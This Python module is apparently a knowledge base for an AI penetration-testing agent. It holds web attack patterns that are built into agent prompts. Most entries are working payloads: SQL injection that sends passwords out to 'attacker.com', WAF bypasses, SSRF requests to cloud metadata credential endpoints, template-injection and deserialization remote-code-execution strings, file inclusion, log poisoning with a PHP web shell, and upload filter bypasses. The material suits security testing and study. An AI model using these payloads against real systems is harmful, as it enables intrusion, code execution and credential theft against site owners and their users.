"""Web application security knowledge base.

Deep knowledge about web application vulnerabilities:
1. OWASP Top 10 patterns
2. Server-side request forgery (SSRF)
3. Template injection (SSTI)
4. Deserialization attacks
5. File inclusion and upload attacks
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WebAppPattern:
    """A web application security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


WEBAPP_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "web-001", "name": "SQL Injection (Advanced)",
        "category": "injection", "severity": "critical",
        "desc": "Advanced SQL injection techniques.",
        "detection": (
            "SQL INJECTION (ADVANCED):\n"
            "BLIND SQL INJECTION:\n"
            "  # Boolean-based blind\n"
            "  ' AND 1=1-- (true) vs ' AND 1=2-- (false)\n"
            "  ' AND SUBSTRING(username,1,1)='a'--\n"
            "  # Time-based blind\n"
            "  ' AND SLEEP(5)--  (MySQL)\n"
            "  '; WAITFOR DELAY '0:0:5'--  (MSSQL)\n"
            "  ' AND pg_sleep(5)--  (PostgreSQL)\n"
            "OUT-OF-BAND:\n"
            "  # DNS exfiltration\n"
            "  ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',\n"
            "    (SELECT password FROM users LIMIT 1),\n"
            "    '.attacker.com\\\\a'))--\n"
            "  # HTTP exfiltration (Oracle)\n"
            "  ' UNION SELECT UTL_HTTP.REQUEST('http://attacker/'||\n"
            "    (SELECT password FROM users WHERE ROWNUM=1)) FROM dual--\n"
            "SECOND-ORDER:\n"
            "  - Inject payload in one field (e.g., username)\n"
            "  - Triggered when used in another query later\n"
            "  - Stored procedures, view generation\n"
            "WAF BYPASS:\n"
            "  /*!50000 UNION*/ /*!50000 SELECT*/ 1,2  # Version comment\n"
            "  UNION%09SELECT%091,2  # Tab instead of space\n"
            "  UniOn SeLeCt 1,2  # Case variation\n"
            "  UN/**/ION SE/**/LECT 1,2  # Inline comment\n"
            "  0x756e696f6e  # Hex encoding\n"
            "TOOLS:\n"
            "  sqlmap --risk=3 --level=5 -u <url>  # Aggressive\n"
            "  sqlmap --tamper=space2comment,between  # WAF bypass"
        ),
        "tools": ["sqlmap"],
    },
    {
        "id": "web-002", "name": "SSRF (Server-Side Request Forgery)",
        "category": "ssrf", "severity": "critical",
        "desc": "SSRF attack techniques.",
        "detection": (
            "SERVER-SIDE REQUEST FORGERY (SSRF):\n"
            "BASIC SSRF:\n"
            "  # Internal service access\n"
            "  url=http://127.0.0.1:8080/admin\n"
            "  url=http://localhost:6379/  # Redis\n"
            "  url=http://169.254.169.254/latest/meta-data/  # AWS IMDS\n"
            "CLOUD METADATA:\n"
            "  # AWS\n"
            "  http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "  # GCP\n"
            "  http://metadata.google.internal/computeMetadata/v1/\n"
            "  # Azure\n"
            "  http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
            "FILTER BYPASS:\n"
            "  - IP encoding: 127.0.0.1 = 0x7f000001 = 2130706433\n"
            "  - IPv6: http://[::1]/\n"
            "  - DNS rebinding: attacker domain resolves to internal IP\n"
            "  - URL encoding: http://%31%32%37%2e%30%2e%30%2e%31/\n"
            "  - Redirect: attacker.com redirects to internal\n"
            "  - URL parser confusion: http://evil.com#@internal/\n"
            "PROTOCOL SMUGGLING:\n"
            "  - gopher://: Raw TCP via SSRF\n"
            "  - dict://: Interact with dict servers\n"
            "  - file:///etc/passwd: Local file read\n"
            "  - ldap://: LDAP queries\n"
            "DETECTION:\n"
            "  # Look for URL parameters: url=, path=, src=, redirect=\n"
            "  # PDF generators, image fetch, webhook URLs\n"
            "  # Burp Collaborator / Interactsh for OOB detection"
        ),
        "tools": ["burpsuite", "nuclei"],
    },
    {
        "id": "web-003", "name": "Template Injection (SSTI)",
        "category": "ssti", "severity": "critical",
        "desc": "Server-side template injection techniques.",
        "detection": (
            "SERVER-SIDE TEMPLATE INJECTION (SSTI):\n"
            "DETECTION:\n"
            "  # Mathematical expression\n"
            "  {{7*7}} → 49  # Jinja2, Twig\n"
            "  ${7*7} → 49  # FreeMarker, Velocity\n"
            "  #{7*7} → 49  # Thymeleaf\n"
            "  <% 7*7 %> → 49  # ERB\n"
            "  {{7*'7'}} → 7777777  # Jinja2 (string repeat)\n"
            "EXPLOITATION:\n"
            "  # Jinja2 (Python)\n"
            "  {{config.items()}}  # Dump config\n"
            "  {{''.__class__.__mro__[1].__subclasses__()}}  # Find subclasses\n"
            "  {{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}  # RCE\n"
            "  # Twig (PHP)\n"
            "  {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
            "  # FreeMarker (Java)\n"
            "  <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
            "  # Velocity (Java)\n"
            "  #set($rt=$class.forName('java.lang.Runtime').getRuntime())$rt.exec('id')\n"
            "  # ERB (Ruby)\n"
            "  <%= system('id') %>\n"
            "TPLMAP:\n"
            "  tplmap -u 'http://target/?name=*'  # Automated SSTI\n"
            "  # Supports: Jinja2, Mako, Tornado, Twig, Smarty, etc."
        ),
        "tools": ["tplmap", "burpsuite"],
    },
    {
        "id": "web-004", "name": "Deserialization Attacks",
        "category": "deserialization", "severity": "critical",
        "desc": "Unsafe deserialization techniques.",
        "detection": (
            "DESERIALIZATION ATTACKS:\n"
            "JAVA:\n"
            "  # Detect: Content-Type: application/x-java-serialized-object\n"
            "  # Magic bytes: AC ED 00 05 (base64: rO0ABX)\n"
            "  # ysoserial: Generate payloads\n"
            "  java -jar ysoserial.jar CommonsCollections7 'id' > payload.ser\n"
            "  # Common gadget chains:\n"
            "  - CommonsCollections (1-7)\n"
            "  - Spring, Hibernate, ROME\n"
            "  - JBoss, WebLogic, WebSphere\n"
            "PHP:\n"
            "  # Detect: serialized strings O:4:\"User\"...\n"
            "  # __wakeup(), __destruct(), __toString() magic methods\n"
            "  # phpggc: PHP Generic Gadget Chains\n"
            "  phpggc Laravel/RCE1 system id\n"
            "PYTHON:\n"
            "  # pickle.loads() is dangerous\n"
            "  # Detect: serialized objects, base64 encoded pickle\n"
            "  # Exploit: __reduce__ method\n"
            "  import pickle, os\n"
            "  class Exploit:\n"
            "      def __reduce__(self): return (os.system, ('id',))\n"
            "  pickle.dumps(Exploit())\n"
            ".NET:\n"
            "  # BinaryFormatter, ObjectStateFormatter\n"
            "  # ysoserial.net for payloads\n"
            "  # ViewState deserialization\n"
            "NODE.JS:\n"
            "  # node-serialize, cryo\n"
            "  {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}"
        ),
        "tools": ["ysoserial", "phpggc", "burpsuite"],
    },
    {
        "id": "web-005", "name": "File Inclusion and Upload",
        "category": "file", "severity": "high",
        "desc": "File inclusion and upload attack techniques.",
        "detection": (
            "FILE INCLUSION AND UPLOAD:\n"
            "LOCAL FILE INCLUSION (LFI):\n"
            "  # Basic\n"
            "  page=../../../../../../etc/passwd\n"
            "  page=....//....//....//etc/passwd  # Double encoding\n"
            "  page=..%252f..%252f..%252fetc/passwd  # Double URL encode\n"
            "  # Null byte (PHP < 5.3)\n"
            "  page=../../../etc/passwd%00\n"
            "  # PHP wrappers\n"
            "  page=php://filter/convert.base64-encode/resource=index.php\n"
            "  page=php://input  (POST: <?php system('id'); ?>)\n"
            "  page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+\n"
            "  # Log poisoning\n"
            "  User-Agent: <?php system($_GET['cmd']); ?>\n"
            "  page=/var/log/apache2/access.log&cmd=id\n"
            "REMOTE FILE INCLUSION (RFI):\n"
            "  page=http://attacker/shell.php\n"
            "  # Requires: allow_url_include = On (PHP)\n"
            "FILE UPLOAD:\n"
            "  # Bypass extension filter\n"
            "  shell.php.jpg, shell.phtml, shell.php5\n"
            "  shell.php%00.jpg  # Null byte\n"
            "  shell.PHP  # Case variation\n"
            "  # Bypass Content-Type filter\n"
            "  Content-Type: image/jpeg (with PHP content)\n"
            "  # Bypass magic bytes\n"
            "  GIF89a; <?php system('id'); ?>\n"
            "  # .htaccess upload\n"
            "  AddType application/x-httpd-php .jpg"
        ),
        "tools": ["ffuf", "burpsuite"],
    },
]


class WebAppSecurityKB:
    """Web application security knowledge base.

    Provides web app vulnerability patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WebAppPattern] = {}
        self._log = logger.bind(component="webapp_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load web app patterns."""
        for data in WEBAPP_PATTERNS:
            pattern = WebAppPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[WebAppPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_webapp_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build web application security prompt."""
        lines = ["## Web Application Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
